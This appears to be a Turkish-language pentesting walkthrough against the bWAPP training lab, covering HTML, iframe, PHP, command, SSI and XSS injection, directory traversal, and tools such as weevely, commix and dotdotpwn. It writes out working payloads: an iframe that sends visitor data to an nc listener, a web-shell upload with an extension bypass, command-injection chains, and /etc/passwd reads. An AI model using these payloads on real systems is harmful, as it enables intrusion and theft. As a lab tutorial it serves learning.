SQL İNJECTİON - REFLECTED (GET)

![photo_6023604428080265317](https://user-images.githubusercontent.com/110966683/183882924-70f82c7d-2eda-466c-9db7-4680c145040d.jpeg)

bu panelde html açığı olup olmadığını anlamak için panele html kodu yazıyoruz ben örnek olarak başlık satırı içinde adımı  yazıyorum.

![photo_6025856227893950465_w](https://user-images.githubusercontent.com/110966683/183883997-b8cb1b5b-2198-4612-ac88-f445d160f5e6.jpeg)

gördüğümüz gibi başlık olarak yazdı 

alert scripti deneyelim şimdi ekrana 1 yazdırması lazım

<h1>Hello,<script>alert(1)</script>!</h1>

![photo_6023604428080265318_w](https://user-images.githubusercontent.com/110966683/183884371-f0fefa5a-4830-465d-8f45-8b239cb8ccf7.jpg)

HTML İNJECTİON - STORED (BLOG)

eğer bir stored açığı olursa burda çalıştırdığımız bir kod web sitesine giren herkesi etkiler farklı bilgisayrdan bu web sitesine girseniz bile hackerin çalıştırdığı kod çalışacaktır.
örnek olarak alert scripti çalıştırırsak giren her kullanıcı bu alerti görür
alert scripti: <h1>Hello,<script>alert(1)</script>!</h1>
peki daha teklikeli olarak ne yapılabilir;
<iframe src="http://192.168.245.148:4545/test" height="0"  width="0"></iframe>
kendi bilgisayarımızın ip sini ve kullanılmayan bir portadresi yazıyoruz 

bu komut sayesinde siteye giren kullanıcıların bilgileri bilgisayarımıza gelir
dinlemek için linux terminalimizde natcat kullanacağız 
linux natcat komutu: nc -nvlp 4545 dinlemek için 


![photo_6023604428080265325_w](https://user-images.githubusercontent.com/110966683/183884730-c7d1a93e-aefe-488d-938b-738bfcd1d907.jpg)


görüldüğü gibi belirlediğimizportu dinledi ve kullanıcının bilgilerini getirdi.

İFRAME ENJECTİON


iframe enjeksiyonunda brupsuiti açıp proxy kısmından intercepti açıyoruz bu sayede tüm paketler yollanmadan buraya geliyor burda gelen paketi değiştirip forward  ediyoruz ve bizim yaptığımız değişikle site açılıyor 


![photo_6025856227893950471_w](https://user-images.githubusercontent.com/110966683/183889548-d56fb3e7-74a5-48ff-b77d-1a23062e705c.jpg)

gelen paket bu şekilde 

![photo_6025856227893950472_w](https://user-images.githubusercontent.com/110966683/183889597-765c5d39-cf45-40dc-ac85-7108d3520731.jpg)

görülen html kodunu yazıp forward ediyoruz 


![photo_6025856227893950474_w](https://user-images.githubusercontent.com/110966683/183889800-b5779563-0cdb-4db4-ab5e-396398df50a4.jpg)

görüldüğü gibi yazdığımız kod çalıştı.

PHP İNJECTİON

php urlsinde komut çalıştırmayı deniyoruz 
normalde iki komut çalıştırmek için komutların arasına ; konur şimdi bunu deneyeceğiz
; koyup system("whoamı") çalıştırıyoruz yani sistem içinde ben kimim komutu çalıştırıyoruz 

php upload açıkları
upload açıkları 
weevely weevely aracı bizim için php payloadı oluşturuyor 
weevely generate 123456 myweevely.php
weevely generate yazıp şifre sonrada isim yazıp payload oluşturuyoruz bunu resim update etme yerinden update etmeyi deneyeceğiz ve upload olunca weevely aracımıza gelip 
weevely yazıyoruz sonra update ettiğimiz url yi ve son olarak şifreyi yazıp giriyoruz 

![photo_6025856227893950494_w](https://user-images.githubusercontent.com/110966683/183912608-ed9b34b1-5c7d-44b5-9e28-b0ecf7d5f834.jpg)


gördüğünüz gibi sistemi hackledik.

varsayalım ki php yüklemeye çalıştığınız sistem .php uzantısını engellemiş o zaman linux terminalimize gelip cp myweevely.php myweevely.php3 (3 olmak zorunda değil siz başka rakamda deneyebilirsiniz.)şeklinde deneyebilirsiniz yani php dosyamızın adını php3 olarak değiştirdik sadece ama uzantı olarak hala php alternatif olarak denenebilir. 



kod çalıştırma açıkları
dns lookup da google.com yazınca server ip adres, falan çıktığını görüyoruz demekki burda bir komut çalışıyor ve bu bilgiler bize geliyor.

![photo_6025856227893950502_w](https://user-images.githubusercontent.com/110966683/183921757-a1247bc9-64c7-4e48-9fd9-a473487bafcd.jpg)



 şimdi biz burda kendi komutlarımızı çalıştırmayıdeneyeceğiz.
 öncelikle her zamanki gibi yazdığımız şeyden sonra ; koyup komut çalıştırıyoruz 


![photo_6025856227893950501_w](https://user-images.githubusercontent.com/110966683/183921778-f63217ea-c0f4-4dee-a8d0-283ff1959517.jpg)



gördüğünüz gibi ls komutu çalıştı demekki burda kod çalıştırma açığı var.
ekstra olarak site ; işaretini engellemiş olabilir biz kendi terminalimizde 2 komut çalıştırmak istediğimizde && (ve) işaretini koyarsak yazılan 2 komutu da çalıştır anlamına gelir ya da | (alt ve tire tuşlarıyla yapabilirsiniz) işaretiye ilkkomutu çalıştır ilk komutun cevabını al 2. komutta kullan anlamına gelen bu işareti kullanırız o yüzden ; olmazsa tek tek diğer işaretleride deneyebilirsiniz.


bunun için linux ta hazır bir tool var onu inceleyelim
commix
nasıl çalıştığını anlamak için öncelikle commix --help yazıp dökümanına bakabilirsiniz 
ama daha öncesinde burp suiti açmamız gerek burp suiti açıp target kısmından  bWAPP klasörüne gelip  post medodunu açıyoruz burda bizemiz hakkında bilgiler yazıyor

![photo_6025856227893950508_w](https://user-images.githubusercontent.com/110966683/183929265-e9f02c35-f80e-4215-909d-61705a5ce74f.jpg)


şimdi bu bilgileri kullanarak commix toolumuzu çalıştıracağız 


commix --url="http://192.168.1.74/bWAPP/commandi.php" --cookie="PHPSESSID=384fe54d2b5eb725e8f877f27ec54b5f; security_level=0" --data="target=www.google.com%3Bls&form=submit"


![photo_6025856227893950514_w](https://user-images.githubusercontent.com/110966683/183929316-a19799a3-b7fe-4ad2-9e35-54ee536c9e67.jpg)



gördüğünüz gibi ben burda gerekli bilgileri yazıp çalıştırdan sonra commix bizim için hemen bir shell açtı ve siteye bağlandı "?" kullanarak neler yapabileceğinizi görebilirsiniz.


SSI SERVER SİDE İNCLUDE AÇIKLARI
bir sunucuda çalışan programlama dili (scriptİ) diyebiliriz 



eğerki bir web sitesinde .shtml görüyarsanız o web sitesinde ssı vardır.


![photo_6028108027707636191_w](https://user-images.githubusercontent.com/110966683/184119990-382deefc-701e-45d5-8228-08cf6d096674.jpg)


gördüğünüz gibi sitemizde .shtml var

![photo_6028108027707636192_w](https://user-images.githubusercontent.com/110966683/184120309-9e3e7c24-d736-4e56-af81-9c631df301ee.jpg)

şimdi ssı kodlarına bakıp örnek bir komut çalıştıralım.

![photo_6028108027707636193_w](https://user-images.githubusercontent.com/110966683/184120623-a6ea8b79-bc9e-4e8d-86ce-549ce699580f.jpg)


gördüğünüz gibi ls komutu çalıştı demekki ssı açığı var.

şimdi nc komutu çalıştırıp sistemi hacklemeyi deneyelim

kali terminalimizden nc -nvlp 1234 komutunu çalıştırıp 1234 portunu dinlemeye başlıyoruz

![photo_6028108027707636195_w](https://user-images.githubusercontent.com/110966683/184121007-70face33-0498-4739-a55c-83ab576260b7.jpg)


ve gördüğünüz gibi bağlantı geldi yazdığımız komutlarla sistemi hacklediğimizi görüyoruz.

DİRECTORY TRAVERSEL AÇIKLARI 
erişim sağlanan yerlerde bug var yani erişimimiz olmayan dosyaları görebilme açıkları 
directory traversel - files:

![photo_6028108027707636196_w](https://user-images.githubusercontent.com/110966683/184121451-864aef7b-b6d9-4b7b-8de9-92906c7603a2.jpg)


kali terminalimizde geri gitmek için nasıl cd .. komutunu kullanıyorsak burda da onu deneyeceğiz message.txt yazan yeri silip bi kaç dosya geri gelelim ve bakalım /etc/passwd 
klasörünü görebilecekmiyiz deneyelim.

![photo_6028108027707636207_w](https://user-images.githubusercontent.com/110966683/184125098-b858c0c8-71dc-425f-b9a0-5b88c6a774ae.jpg)


evet gördüğünüz gibi 4 dosya geri gelip /etc/passwd yazınca dosya bilgilerini görüyoruz 

bunun için linux ta hazır bir tool var inceleyelim 
dotdotpwn 

eğer sizde yüklü değilse apt-get install dotdotpwn  yazarak yükleyebilirsiniz 
komutu çalıştırmak için dotdotpwn -m http -h 192.168.245.159/bWAPP/directory_traversal_1.php?page=message.txt (bwapp urlsini http olmadan yapıştırıyoruz)

![photo_6028108027707636198_w](https://user-images.githubusercontent.com/110966683/184122721-f567d9b2-d7e3-4b6a-aa09-a197c254ef52.jpg)
yazdık çalıştıralım 

![photo_6028108027707636199_w](https://user-images.githubusercontent.com/110966683/184122901-5442150a-fe18-451c-9017-d51ef7bac040.jpg)


gördüğünüz gibi sonuçlar geldi sonuçları incelersek manuel yaptığımız işlemleri tek tek deniyor hatta  "/" işaretinin filtrelenmiş olabilieceğini hesaplayıp mesela %5 yazmış html kodlarına bakarsanız "/" işaretinin "%5" e denk geldiğini görürsünüz


![photo_6028108027707636200_w](https://user-images.githubusercontent.com/110966683/184123286-100724b8-6fa4-45f9-b480-b55d4692fe46.jpg)


aşşağı indikçe bu şekilde çok örnek görebilirsiniz default olarak 6 ayarlandığı için her şey 6 defa denenmiş

XSS AÇIKLARI 
web pentesting yaparken karşımıza en fazla çıkan açık türüdür.
xss reflected get:
siteye normal kullanıcı adı şifremizi yazınca url de gözüğtüğünü görüyoruz

![photo_6028108027707636201_w](https://user-images.githubusercontent.com/110966683/184123614-576c16b3-1246-4693-bceb-3c95343f9e8e.jpg)


şimdi java script kodu çalıştırabiliyormuyuz deneyelim java script bilmiyorsanız  googleye xss payloads yazıp çıkan siteden aldığınız kodları deneyebilirsiniz örnek olarak alert kodu çalıştırıyoruz 
 <script>alert(123);</script>


![photo_6028108027707636202_w](https://user-images.githubusercontent.com/110966683/184123947-8a379ae0-6f8a-4e90-941e-5574cad0ca9a.jpg)


gördüğünüz gibi kodumuz çalıştI ve ekrana alert verdi









